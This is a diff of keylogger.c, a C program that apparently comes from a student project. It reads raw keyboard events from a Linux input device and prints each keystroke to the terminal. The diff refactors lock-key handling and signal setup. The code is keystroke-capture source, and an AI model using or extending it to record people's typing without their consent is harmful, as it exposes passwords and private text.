@@ -1,27 +1,15 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   keylogger.c                                        :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
-/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
-
 #include <signal.h>
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <linux/kd.h>
 #include <wchar.h>
-#include <X11/XKBlib.h>
-#include <stdlib.h>
 
 #include "keylogger.h"
 #include "keys.h"
 #include "debug.h"
+#include <errno.h>
+#include <string.h>
 
 static int			loop;
 
@@ -31,31 +19,14 @@ static void 		sigint(int sig)
 		loop = 0;
 }
 
-static int			get_keystate(int *caps, int *num)
-{
-  Display 			*display;
-  char				*monitor;
-  unsigned 			state;
-
-	monitor = getenv("DISPLAY");
-	display = XOpenDisplay((monitor) ? monitor : ":0");
-	if (!display)
-		return printf("Can't get display to find Lockers states.\n");
-	if (XkbGetIndicatorState(display, XkbUseCoreKbd, &state) != Success)
-		return printf("Can't get indicator state for Lockers.\n");
-	*caps = state & 1;
-	*num = state & 2;
-	return (0);
-}
-
-static int  		print_keysym(int **key_table, int index, int state, int *capslock)
+static int  		print_keysym(int *key, int state, int *lockers)
 {
 	static int		modifier = 0;
 	int				code;
 	int 			type;
 	int 			value;
 
-	code = key_table[index][modifier];
+	code = key[modifier];
 	type = KTYP(code);
 	value = KVAL(code);
 	if (type >= syms_size) {
@@ -70,9 +41,9 @@ static int  		print_keysym(int **key_table, int index, int state, int *capslock)
 		type = KT_LATIN;
 	if (type < syms_size && value < syms[type].size) {
 		if (type == KT_SHIFT)
-			return shift_handler(value, state, &modifier, capslock);
+			return shift_handler(value, state, &modifier);
 		if (type == KT_LOCK)
-			return lock_handler(value, state, &modifier, capslock);
+			lock_handler(value, state, &modifier, lockers);
 		if (state)
 			return printf("%s", syms[type].table[value]);
 	}
@@ -87,26 +58,26 @@ void					keylogger(int keybd, int **key_table)
 {
 	int					nbread;			// Number of events received at once.
 	struct input_event	events[128];	// Events read.
-	int 				value;			// Which key have been pressed.
-	int 				state;			// State = 0:released, = 1:pressed, = 2:repeated.
-	int					capslock;
-	int					numlock;
+	int					lockers[NR_LOCK];
 
-	// (void)numlock;
-	for (int i = 0; i < _NSIG; i++)
-		signal(i, sigint);
-	get_keystate(&capslock, &numlock);
+	for (int i = 0; i < NR_LOCK; i++)
+		lockers[i] = 0;
+	// for (int i = 0; i < _NSIG; i++)
+	// 	signal(i, sigint);
+	signal(SIGINT, sigint);
+	lockers[6] = get_keystate(1); // capslock state
+	// capslock = get_keystate(1);
+	// numlock = get_keystate(2);
 	loop = 1;
 	while (loop)
 	{
-		value = state = 0;
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
 		// printf("---------------------------------------------------------\n");
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
 			if (events[i].type == EV_KEY) {
-				value = events[i].code;
-				state = events[i].value;
+				print_keysym(key_table[events[i].code], events[i].value, lockers);
+				fflush(stdout);
 			}
 			// printf("[%s] ", event[events[i].type].name);
 			// if (events[i].type == EV_KEY) {
@@ -127,8 +98,6 @@ void					keylogger(int keybd, int **key_table)
 			// }
 			// printf("\n");
 		}
-		print_keysym(key_table, value, state, &capslock);
-		fflush(stdout);
 		// printf("---------------------------------------------------------\n");
 	}
 }
